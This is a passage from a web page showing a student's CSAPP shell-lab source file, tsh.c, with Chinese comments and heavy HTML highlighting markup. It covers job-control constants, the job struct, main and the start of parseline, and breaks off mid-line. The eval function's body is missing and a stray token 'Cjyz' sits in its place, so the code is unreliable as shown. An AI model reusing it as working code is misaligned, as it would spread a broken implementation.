class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tsh - A tiny shell program with job control</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;Put your name and login ID here&gt;</span></span><br><span class="line"><span class="comment"> * 张恩上 1170300532</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Misc manifest constants */</span></span><br><span class="line"><span class="comment">/*指令显示参数*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE    1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS     128   <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJOBS      16   <span class="comment">/* max jobs at any point in time */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJID    1&lt;&lt;16   <span class="comment">/* max job ID */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Job states */</span></span><br><span class="line"><span class="comment">/*工作声明参数*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNDEF 0 <span class="comment">/* undefined */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FG 1    <span class="comment">/* running in foreground */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BG 2    <span class="comment">/* running in background */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ST 3    <span class="comment">/* stopped */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z 在输入ctrl-z的情况下FG转换为ST</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command 在使用fg命令的情况下 ST转换成FG</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command 在使用bg命令的情况下 ST转换成BG</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command 在使用fg命令的情况下 BG转换成FG</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> * 至多一个工作可以在FG的状态下</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;      <span class="comment">/* defined in libc */</span></span><br><span class="line"><span class="keyword">char</span> prompt[] = <span class="string">"tsh&gt; "</span>;    <span class="comment">/* command line prompt (DO NOT CHANGE) */</span></span><br><span class="line"><span class="keyword">int</span> verbose = <span class="number">0</span>;            <span class="comment">/* if true, print additional output 若为1,则输出额外的内容*/</span></span><br><span class="line"><span class="keyword">int</span> nextjid = <span class="number">1</span>;            <span class="comment">/* next job ID to allocate 下一个要分配的工作ID*/</span></span><br><span class="line"><span class="keyword">char</span> sbuf[MAXLINE];         <span class="comment">/* for composing sprintf messages 关于sprintf的存储内容 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> &#123;</span>              <span class="comment">/* The job struct */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;              <span class="comment">/* job PID */</span></span><br><span class="line">    <span class="keyword">int</span> jid;                <span class="comment">/* job ID [1, 2, ...] */</span></span><br><span class="line">    <span class="keyword">int</span> state;              <span class="comment">/* UNDEF, BG, FG, or ST */</span></span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];  <span class="comment">/* command line */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> <span class="title">jobs</span>[<span class="title">MAXJOBS</span>];</span> <span class="comment">/* The job list 所有工作的数组 */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">sig_atomic_t</span> a;</span><br><span class="line"><span class="comment">/* End global variables */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are the functions that you will implement */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we've provided for you */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="keyword">pid_t</span> fgpid(struct <span class="keyword">job_t</span> *jobs);</span><br><span class="line"><span class="function">struct job_t *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function">struct job_t *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">void</span> <span class="title">handler_t</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">handler_t</span> *Signal(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - The shell's main routine</span></span><br><span class="line"><span class="comment"> * shell的主要步程</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* emit prompt (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect stderr to stdout (so that driver will get all output</span></span><br><span class="line"><span class="comment">     * on the pipe connected to stdout) */</span></span><br><span class="line">    <span class="comment">/*重定位stderr到stdout上,使得进程可以讲所有的输出定位到stdout上*/</span></span><br><span class="line">    dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the command line 分析命令行的结构*/</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">"hvp"</span>)) != EOF) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'h'</span>:             <span class="comment">/* print help message */</span> <span class="comment">/*输出帮助信息*/</span></span><br><span class="line">            usage();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'v'</span>:             <span class="comment">/* emit additional diagnostic info */</span> <span class="comment">/*输出额外的诊断信息*/</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'p'</span>:             <span class="comment">/* don't print a prompt */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>;  <span class="comment">/* handy for automatic testing */</span> <span class="comment">/*便于自动测试*/</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install the signal handlers */</span></span><br><span class="line">    <span class="comment">/*引入信号处理*/</span></span><br><span class="line">    <span class="comment">/* These are the ones you will need to implement */</span></span><br><span class="line">    Signal(SIGINT,  sigint_handler);   <span class="comment">/* ctrl-c */</span></span><br><span class="line">    Signal(SIGTSTP, sigtstp_handler);  <span class="comment">/* ctrl-z */</span></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler);  <span class="comment">/* Terminated or stopped child */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This one provides a clean way to kill the shell */</span></span><br><span class="line">    Signal(SIGQUIT, sigquit_handler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the job list */</span></span><br><span class="line">    <span class="comment">/* 初始化joblist */</span></span><br><span class="line">    initjobs(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Execute the shell's read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">/* 处理命令行操作 */</span></span><br><span class="line"><span class="comment">/* Read command line */</span></span><br><span class="line"><span class="keyword">if</span> (emit_prompt) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, prompt);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">    app_error(<span class="string">"fgets error"</span>);</span><br><span class="line"><span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Evaluate the command line */</span></span><br><span class="line"><span class="comment">/* 对command的内容进行处理 */</span></span><br><span class="line">eval(cmdline);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don't receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.</span></span><br><span class="line"><span class="comment"> eval函数的功能是根据使用者从命令行中输入的命令来进行操作。如果使用者已经请求了一个我们建立好的命令</span></span><br><span class="line"><span class="comment"> （比如说我们之后体现出的：quit，jobs，bg或者fg），那么我们就要立刻去执行它。否则的话，我们就要调</span></span><br><span class="line"><span class="comment"> 用fork（）函数去申请一个子进程，并在子进程中去执行这个工作。如果这个工作是在前端工作的话，</span></span><br><span class="line"><span class="comment"> 那么我们就等待它知道它结束并返回。</span></span><br><span class="line"><span class="comment">注意：每一个子进程都会有一个特有的进程组ID，以便于当我们从键盘键入ctrl+z或者ctrl+c的时候，后端子进程不</span></span><br><span class="line"><span class="comment">会从内核接收到SIGINT(SIGTSTP)信号。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Cjyz</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * parseline -  the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">' 